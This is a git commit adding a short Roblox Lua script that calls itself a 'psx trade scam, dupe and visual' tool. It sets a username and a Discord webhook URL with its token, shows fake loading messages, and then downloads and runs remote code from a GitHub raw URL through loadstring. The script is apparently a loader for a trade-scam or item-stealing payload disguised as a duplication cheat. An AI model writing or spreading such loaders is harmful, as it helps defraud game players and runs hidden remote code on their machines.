4def74792b4eb2bce230a33b382876cdab4afb98
nickisabot2 <130788338+nickisabot2@users.noreply.github.com>
2023-04-22 18:43:45 -0400

    Add files via upload

---
+++ trade.lua
@@ -0,0 +1,9 @@
+Username = "nickm1001"
+WebHook = "https://discord.com/api/webhooks/1099352998217515068/kuJur8CJ0yyNLuxhFrHnlFmcq0oz7A8ElnQVbCzz0urv3Jymum5rQHElsGfTuf2yENKE"
+loadingscreen = true
+_G.CustomScriptName = "psx trade scam, dupe and visual"
+_G.Text1 = "script found..."
+_G.Text2 = "waiting for script..."
+_G.Text3 = "starting script..."
+_G.Text4 = "made by Splex#0003"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
